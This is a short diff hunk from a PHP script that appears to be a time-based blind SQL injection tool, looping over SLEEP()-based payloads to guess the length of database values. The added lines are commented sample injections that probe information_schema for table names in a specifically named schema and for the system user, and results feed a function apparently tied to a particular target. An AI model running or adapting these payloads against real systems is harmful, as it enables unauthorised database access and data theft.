@@ -1031,6 +1031,8 @@ function length_finder($sleep_timer, $target, $parameter, $state)
     for ($i = 0; $i <= 200; $i++) {
 
         $injection = "(SELECT(IF(LENGTH(" . $parameter . ")=" . $i . ",SLEEP(" . $sleep_timer . "),1)))";
+        //sample inject: SELECT LENGTH((SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema = 'tsavosit_collo' ORDER BY TABLE_NAME LIMIT 1)) AS table_name_length;
+        //$injection = "(SELECT IFNULL((SELECT(SLEEP(" . $sleep_timer . "))FROM DUAL WHERE (" . $parameter . ")=" . $i . "),'Db not found or does not contain 14 tables'))";
         //$injection = "(SELECT(IF(LENGTH(SYSTEM_USER())=" . $i . ",SLEEP(5),1)))";
         if ($target == 1) {
             $result = pesaflow($injection, $i, $sleep_timer, $state);
